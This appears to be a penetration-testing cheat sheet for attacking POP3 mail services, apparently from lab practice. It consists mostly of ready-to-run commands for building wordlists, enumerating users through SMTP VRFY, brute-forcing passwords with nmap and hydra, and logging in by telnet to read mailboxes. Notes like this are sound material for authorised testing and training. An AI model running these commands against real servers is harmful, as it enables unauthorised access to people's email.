# Port 110 - Pop3

Check this port only if you need to prioritize this port to be investigated. Often password bruteforcing is time consuming, so check if you can manually login with a username as username and password and read emails.&#x20;

### Guess username and password

```bash
nmap -sV --script=pop3-brute <target IP address> 
```

### Create (or reuse) username and password list

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Username
</strong>cewl http://postfish.off/team.html --with-numbers --lowercase  -w userlist.txt
wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
python usernamer.py -f users_in_team_page -l >> userlist.txt
cat /usr/share/seclists/Usernames/Names/names.txt >> userlist.txt 

# Password 
cat userlist.txt > password.txt
cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt >> password.txt
</code></pre>

### Enumerate users

{% code overflow="wrap" %}
```bash
/usr/share/legion/scripts/smtp-user-enum.pl -U userlist.txt -M VRFY -t 192.168.157.137 -m 64
# -U: user list
# -M: method to use for email verification
# -t: target
# -m: max number of concurrent threads
```
{% endcode %}

### Bruteforce passwords

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
hydra -l sales -P userlist.txt -f 192.168.157.137 pop3 -V -t 64
# -l: username
# -P: password list
# -f: force to stop once a password is found
# -V: verbose mode
# -t: the number of threads
```

### POP3 commands

```
USER   	Your user name for this mail server
PASS   	Your password.
QUIT  	 End your session.
STAT   	Number and total size of all messages
LIST   	Message# and size of message
RETR 	message#  Retrieve selected message
DELE 	message#  Delete selected message
NOOP   	No-op. Keeps you connection open.
RSET   	Reset the mailbox. Undelete deleted messages.
```

### Manual login and read emails

```bash
# Login 
>telnet <IP> pop3

+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready                                                                                                          
USER ryuu                                                                                                                                                     
+OK                                                                                                                                                           
PASS ryuu                                                                                                                                                     
+OK Welcome ryuu    

# Retrieve emails
LIST                                                                                                                                                          
+OK 2 1807                                                                                                                                                    
1 786                                                                                                                                                         
2 1021   
	
RETR 1
RETR 2
QUIT
```

###
